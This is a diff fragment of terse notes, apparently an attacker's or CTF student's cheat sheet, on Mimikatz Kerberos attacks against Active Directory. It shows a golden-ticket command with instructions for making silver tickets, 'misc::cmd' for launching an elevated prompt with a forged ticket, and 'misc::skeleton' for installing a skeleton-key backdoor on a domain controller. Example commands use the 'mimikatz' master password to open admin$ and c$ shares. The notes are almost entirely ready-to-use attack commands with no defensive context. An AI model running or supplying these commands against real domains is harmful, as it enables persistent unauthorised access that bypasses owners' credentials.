@@ -43,6 +43,21 @@ kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-4329
 to create a silver ticket - put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
 
 
+---
 
+### using the ticket
+`misc::cmd`
+open a new elevated cmd prompt with given ticket
 
+---
 
+### skeleton key (kerberos backdoor)
+`misc::skeleton`
+
+**examples**
+
+`net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz`
+The share will now be accessible without the need for the Administrators password
+
+`dir \\Desktop-1\c$ /user:Machine1 mimikatz`
+access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
